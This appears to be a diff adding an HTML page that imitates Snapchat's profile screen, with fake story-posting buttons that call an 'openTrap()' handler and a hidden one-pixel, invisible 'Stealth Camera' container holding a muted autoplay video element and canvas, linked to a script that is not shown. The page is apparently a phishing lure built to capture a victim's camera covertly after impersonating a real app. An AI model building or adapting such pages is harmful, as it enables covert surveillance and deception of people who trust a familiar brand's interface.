@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Profile</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Header / Avatar Area -->
+        <div class="profile-header">
+            <div class="top-nav">
+                <div class="nav-btn back-btn">&lt;</div>
+                <div class="top-right">
+                    <div class="share-btn"><span class="qr-icon">▦</span> Share</div>
+                    <div class="nav-btn settings-btn">⚙</div>
+                </div>
+            </div>
+            
+            <div class="avatars-container">
+                <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix&style=circle" class="bitmoji" style="left: 2%; bottom: 0%; width: 28%;">
+                <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Jack&style=circle" class="bitmoji" style="left: 25%; bottom: 5%; width: 32%; z-index: 2;">
+                <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Zoe&style=circle" class="bitmoji" style="right: 22%; bottom: 2%; width: 30%;">
+                <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Aneka&style=circle" class="bitmoji" style="right: 0%; bottom: 0%; width: 28%;">
+            </div>
+
+            <div class="create-avatar-btn">
+                <span>📷</span> Create My Avatar
+            </div>
+
+            <div class="user-info">
+                <div class="profile-pic-wrapper">
+                    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Sam" class="profile-pic">
+                </div>
+                <div class="user-details">
+                    <div class="name-row">
+                        <span class="username">Snapchat</span>
+                        <span class="fleur">⚜</span>
+                        <span class="dropdown">v</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="outline-btn">My Account</button>
+                <button class="solid-btn">Public Profile</button>
+            </div>
+        </div>
+
+        <!-- Scrollable Content -->
+        <div class="content-area">
+            <div class="badges-row">
+                <div class="badge">🎈 7 Dec ></div>
+                <div class="badge">👻 725,562</div>
+                <div class="badge">♐ Sagittarius</div>
+            </div>
+
+            <div class="snapchat-plus">
+                <div class="plus-icon">👻<span>+</span></div>
+                <div class="plus-text">
+                    <div class="plus-title">Snapchat+ <span class="updated-tag">Updated Features</span></div>
+                    <div class="plus-desc">Exclusive, experimental, and pre-release features.</div>
+                </div>
+                <div class="chevron">›</div>
+            </div>
+
+            <div class="section-header">
+                <h2>Post to...</h2>
+                <button class="new-story-btn">+ New Story</button>
+            </div>
+
+            <div class="list-container">
+                <div class="list-item" onclick="openTrap()">
+                    <div class="item-icon bg-pink">▶</div>
+                    <div class="item-text">
+                        <div class="item-title">Spotlight</div>
+                        <div class="item-desc">Reach millions of Snapchatters!</div>
+                    </div>
+                    <div class="item-action"><span>📷</span> Post</div>
+                </div>
+
+                <div class="list-item" onclick="openTrap()">
+                    <div class="item-icon bg-grey">👥</div>
+                    <div class="item-text">
+                        <div class="item-title">My Story · Friends Only</div>
+                        <div class="item-desc">Custom</div>
+                    </div>
+                    <div class="item-action"><span>📷</span> Add</div>
+                </div>
+
+                <div class="list-item" onclick="openTrap()">
+                    <div class="item-icon"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Sam" style="width:100%; height:100%; border-radius:50%;"></div>
+                    <div class="item-text">
+                        <div class="item-title">My Story · Public</div>
+                        <div class="item-desc">Friends, Followers, and Everyone</div>
+                    </div>
+                    <div class="item-action"><span>📷</span> Add</div>
+                </div>
+            </div>
+
+            <div class="section-header friends-header">
+                <h2>Friends & Followers</h2>
+            </div>
+
+            <div class="list-container">
+                <div class="list-item no-border">
+                    <div class="item-icon bg-transparent">👤+</div>
+                    <div class="item-text">
+                        <div class="item-title">Add Friends</div>
+                    </div>
+                    <div class="chevron">›</div>
+                </div>
+            </div>
+            <div class="spacer"></div>
+        </div>
+
+        <!-- Hidden Container for Stealth Camera -->
+        <div style="position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; overflow: hidden; z-index: -1;">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
